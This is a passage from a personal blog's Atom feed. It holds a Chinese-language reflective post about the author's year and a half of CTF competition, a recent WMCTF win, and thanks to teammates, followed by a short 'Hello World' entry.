    <content type="html"><![CDATA[<p>到2020年8月5日为止，入CTF坑也接近一年半了。我看着身边的师傅们逐渐都搭建起了自己的博客，而我却一直迟迟未建，也许是因为懒，也许是畏惧搭建博客过于困难。我知道，我一直习惯于偷懒和拖延，但近期发生了这许多事，已经不容许我继续这样浑水摸鱼下去了。</p><p>学习CTF竞赛的过程中，我绝对谈不上废寝忘食，充其量也只能称为“还算认真”。三年失败的高中生活以来，也确实很少有我愿意去认真做的事情，我也一直很清楚，这是我的致命弱点，这也导致我跟不上许多大师傅的脚步。最近WMCTF大获全胜的一战，容易让人飘然忘本，应当在狂欢后正视自身的问题，革命尚未成功，同志仍需努力。</p><p>话已讲完，那么，就以这篇随笔为里程碑，开始一段新的旅程吧。</p><p>PS：最后献上对这些大师傅们的感谢，他们都给了我很大的帮助：<strong>Van1sh, Soreat_u, 0xdktb, coinc1dens, shal10w,  badmonkey, and all 0x401 team-mates.</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;到2020年8月5日为止，入CTF坑也接近一年半了。我看着身边的师傅们逐渐都搭建起了自己的博客，而我却一直迟迟未建，也许是因为懒，也许是畏惧搭建博客过于困难。我知道，我一直习惯于偷懒和拖延，但近期发生了这许多事，已经不容许我继续这样浑水摸鱼下去了。&lt;/p&gt;
&lt;p&gt;学习CTF
      
    
    </summary>
    
    
      <category term="Life" scheme="https://bobpanda.github.io/categories/Life/"/>
    
    
      <category term="随笔" scheme="https://bobpanda.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://bobpanda.github.io/2020/08/04/hello-world/"/>
    <id>https://bobpanda.github.io/2020/08/04/hello-world/</id>
    <published>2020-08-04T14:02:00.975Z</published>
    <updated>2020-08-05T02:35:47.775Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to vagrant’s blog. This is a new start.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to vagrant’s blog. This is a new start.&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="Life" scheme="https://bobpanda.github.io/categories/Life/"/>
    
    
      <category term="随笔" scheme="https://bobpanda.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
